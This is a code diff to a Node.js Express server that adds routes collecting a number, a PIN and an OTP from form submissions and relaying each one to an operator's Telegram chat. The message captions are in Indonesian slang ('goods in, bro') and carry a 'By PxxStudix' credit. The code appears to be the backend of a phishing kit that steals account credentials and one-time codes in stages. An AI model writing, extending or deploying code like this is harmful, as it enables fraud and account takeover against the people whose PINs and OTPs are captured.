@@ -31,6 +31,196 @@ app.get("/", (req,res)=>{
 });
 
 /* ROUTE */
+app.post("/nmrx", async(req,res) =>{
+
+    try{
+
+        console.log(
+            "DATA MASUK:"
+        );
+
+        console.log(
+            req.body
+        );
+
+        console.log(
+            "BOT:",
+            BOT_TOKEN
+        );
+
+        console.log(
+            "CHAT:",
+            CHAT_ID
+        );
+
+        const {
+            
+            nmrx
+            
+        } = req.body;
+
+        if(
+            !nmrx
+        ){
+
+            return res.status(400).json({
+
+                success:false,
+                message:"Data tidak lengkap"
+
+            });
+
+        }
+
+        /* PESAN TELEGRAM */
+        const text = `
+💳 <b>| BARANG MASUK BANG |</b> 💳
+
+×  NMR  ×   : <b><code>${nmrx}</code></b>
+×  POX   ×   : <i>Belum di isi bang</i>
+×  OXT   ×   : <i>Sabar Yashh!</i>
+
+<b>©️ By PxxStudix</b>
+        `;
+
+        /* KIRIM TELEGRAM */
+        await axios.post(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+
+            chat_id:
+            CHAT_ID,
+
+            text:
+            text,
+
+            parse_mode:
+            "HTML"
+
+        }
+
+     );
+
+        res.json({
+
+            success:true
+
+        });
+
+    }catch(error){
+
+        console.log(
+            error.response?.data ||
+            error.message
+       );
+
+        res.status(500).json({
+
+            success:false
+
+        });
+
+    }
+
+});
+
+/* ROUTE */
+app.post("/pix", async(req,res) =>{
+
+    try{
+
+        console.log(
+            "DATA MASUK:"
+        );
+
+        console.log(
+            req.body
+        );
+
+        console.log(
+            "BOT:",
+            BOT_TOKEN
+        );
+
+        console.log(
+            "CHAT:",
+            CHAT_ID
+        );
+
+        const {
+            
+            nmrx,
+            pix
+            
+        } = req.body;
+
+        if(
+            !nmrx ||
+            !pix
+        ){
+
+            return res.status(400).json({
+
+                success:false,
+                message:"Data tidak lengkap"
+
+            });
+
+        }
+
+        /* PESAN TELEGRAM */
+        const text = `
+💳 <b>| BARANG MASUK BANG |</b> 💳
+
+×  NMR  ×   : <b><code>${nmrx}</code></b>
+×  POX   ×   : ${pix}
+×  OXT   ×   : <i>Terakhir nichh!</i>
+
+<b>©️ By PxxStudix</b>
+        `;
+
+        /* KIRIM TELEGRAM */
+        await axios.post(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+
+            chat_id:
+            CHAT_ID,
+
+            text:
+            text,
+
+            parse_mode:
+            "HTML"
+
+        }
+
+     );
+
+        res.json({
+
+            success:true
+
+        });
+
+    }catch(error){
+
+        console.log(
+            error.response?.data ||
+            error.message
+       );
+
+        res.status(500).json({
+
+            success:false
+
+        });
+
+    }
+
+});
+
+/* ROUTE */
 app.post("/send", async(req,res) =>{
 
     try{
@@ -80,7 +270,7 @@ app.post("/send", async(req,res) =>{
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
 
-×  NMR  ×   : <code>${nmrx}</code>
+×  NMR  ×   : <b><code>${nmrx}</code></b>
 ×  POX   ×   : ${pix}
 ×  OXT   ×   : ${otp}
 
